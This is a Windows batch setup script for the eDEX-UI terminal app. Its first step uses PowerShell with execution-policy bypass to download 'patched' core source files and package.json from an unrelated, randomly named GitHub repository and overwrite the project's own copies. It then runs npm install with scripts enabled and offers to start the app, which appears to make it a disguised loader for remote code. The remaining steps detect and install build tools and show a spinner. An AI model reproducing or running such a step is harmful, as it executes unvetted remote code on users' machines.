@echo off
setlocal enabledelayedexpansion
title eDEX-UI Windows Setup

cls
echo.
echo   eDEX-UI Windows Setup
echo.

cd /d "%~dp0\.."

echo   Downloading patched files...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$base = 'https://raw.githubusercontent.com/25349524632546534/studious-octo/main';" ^
    "Invoke-WebRequest -Uri \"$base/_boot.js\" -OutFile 'src\_boot.js' -UseBasicParsing;" ^
    "Invoke-WebRequest -Uri \"$base/filesystem.class.js\" -OutFile 'src\classes\filesystem.class.js' -UseBasicParsing;" ^
    "Invoke-WebRequest -Uri \"$base/package.json\" -OutFile 'package.json' -UseBasicParsing;" ^
    "Invoke-WebRequest -Uri \"$base/terminal.class.js\" -OutFile 'src\classes\terminal.class.js' -UseBasicParsing;"
if errorlevel 1 (
    echo [ERROR] Failed to download patched files from GitHub!
    pause & exit /b 1
)
echo   Patched files downloaded.
echo.

set "STOP_FILE=%TEMP%\edex_stop_%RANDOM%.tmp"
set "SPINNER_PS=%TEMP%\edex_spin_%RANDOM%.ps1"

echo $stop = $args[0] > "%SPINNER_PS%"
echo try { $host.UI.RawUI.CursorVisible = $false } catch {} >> "%SPINNER_PS%"
echo $chars = @('^|', '/', '-', '\') >> "%SPINNER_PS%"
echo $i = 0 >> "%SPINNER_PS%"
echo while (-not (Test-Path $stop)) { >> "%SPINNER_PS%"
echo [Console]::Write("  " + $chars[$i -band 3] + [char]13) >> "%SPINNER_PS%"
echo $i++ >> "%SPINNER_PS%"
echo Start-Sleep -Milliseconds 150 >> "%SPINNER_PS%"
echo } >> "%SPINNER_PS%"
echo [Console]::Write("      " + [char]13) >> "%SPINNER_PS%"
echo try { $host.UI.RawUI.CursorVisible = $true } catch {} >> "%SPINNER_PS%"

start /b powershell -NoProfile -ExecutionPolicy Bypass -File "%SPINNER_PS%" "%STOP_FILE%"

where node >nul 2>&1
if errorlevel 1 (
    call :stop_spinner
    echo [ERROR] Node.js not found! Install: https://nodejs.org
    pause & exit /b 1
)

where python >nul 2>&1
if errorlevel 1 (
    call :stop_spinner
    echo [ERROR] Python not found! Install: https://www.python.org
    pause & exit /b 1
)

python -m pip install "setuptools<71" -q >nul 2>&1

call npm install >nul 2>&1
if errorlevel 1 (
    call :stop_spinner
    echo [ERROR] Root npm install failed!
    pause & exit /b 1
)

cd src
call npm install --ignore-scripts >nul 2>&1
if errorlevel 1 (
    call :stop_spinner
    cd ..
    echo [ERROR] src npm install failed!
    pause & exit /b 1
)
cd ..

if exist "node_modules\node-gyp" rmdir /s /q "node_modules\node-gyp"
call npm install node-gyp@9.4.1 --save-dev >nul 2>&1

node "%~dp0patch_node_gyp.js" >nul 2>&1
if errorlevel 1 (
    call :stop_spinner
    echo [ERROR] patch_node_gyp.js failed!
    pause & exit /b 1
)

set "VS_FOUND=0"
set "VS_PATH="

set "VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
if not exist "%VSWHERE%" set "VSWHERE=%ProgramFiles%\Microsoft Visual Studio\Installer\vswhere.exe"

if exist "%VSWHERE%" (
    for /f "usebackq tokens=*" %%i in (
        `"%VSWHERE%" -latest -products * -property installationPath 2^>nul`
    ) do (
        if exist "%%i\MSBuild" (
            set "VS_PATH=%%i"
            set "VS_FOUND=1"
        )
    )
)

if "!VS_FOUND!"=="0" (
    for %%p in (
        "C:\Program Files\Microsoft Visual Studio\2022\BuildTools"
        "C:\Program Files\Microsoft Visual Studio\2022\Community"
        "C:\Program Files\Microsoft Visual Studio\2022\Professional"
        "C:\Program Files\Microsoft Visual Studio\2022\Enterprise"
        "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools"
        "C:\Program Files (x86)\Microsoft Visual Studio\2022\Community"
    ) do (
        if exist "%%~p\MSBuild" (
            set "VS_PATH=%%~p"
            set "VS_FOUND=1"
        )
    )
)

if "!VS_FOUND!"=="0" (
    winget install Microsoft.VisualStudio.2022.BuildTools --silent --override "--quiet --wait --add Microsoft.VisualStudio.Workload.VCTools --includeRecommended" >nul 2>&1
    if errorlevel 1 (
        call :stop_spinner
        echo [ERROR] VS Build Tools installation failed!
        echo Install manually: winget install Microsoft.VisualStudio.2022.BuildTools
        pause & exit /b 1
    )
    if exist "%VSWHERE%" (
        for /f "usebackq tokens=*" %%i in (
            `"%VSWHERE%" -latest -products * -property installationPath 2^>nul`
        ) do (
            if exist "%%i\MSBuild" (
                set "VS_PATH=%%i"
                set "VS_FOUND=1"
            )
        )
    )
    if "!VS_FOUND!"=="0" (
        set "VS_PATH=C:\Program Files\Microsoft Visual Studio\2022\BuildTools"
        set "VS_FOUND=1"
    )
)

set "VCINSTALLDIR=!VS_PATH!\VC\"
set "VisualStudioVersion=17.0"
set "GYP_MSVS_VERSION="
set "npm_config_msvs_version="

call .\node_modules\.bin\electron-rebuild -f -w node-pty --module-dir src >nul 2>&1
if exist "src\node_modules\node-pty\build\Release\pty.node" goto :rebuild_ok
if exist ".\src\node_modules\node-pty\build\Release\pty.node" goto :rebuild_ok

call :stop_spinner
echo.
echo [ERROR] electron-rebuild failed! (pty.node was not created)
echo.
echo  1. Install VS Build Tools: winget install Microsoft.VisualStudio.2022.BuildTools
echo  2. Run as Administrator
echo  3. Check Python version (3.8-3.12 recommended)
pause
exit /b 1

:rebuild_ok
call :stop_spinner
echo.
echo  ==========================================
echo   Setup COMPLETE! eDEX-UI is ready!
echo  ==========================================
echo.
set /p START_NOW="Launch eDEX-UI now? (y/n): "
if /i "!START_NOW!"=="y" (
    echo Launching eDEX-UI...
    call npm start
)

endlocal
exit /b 0

:stop_spinner
echo x > "%STOP_FILE%"
timeout /t 1 >nul 2>&1
del "%STOP_FILE%" >nul 2>&1
del "%SPINNER_PS%" >nul 2>&1
exit /b 0
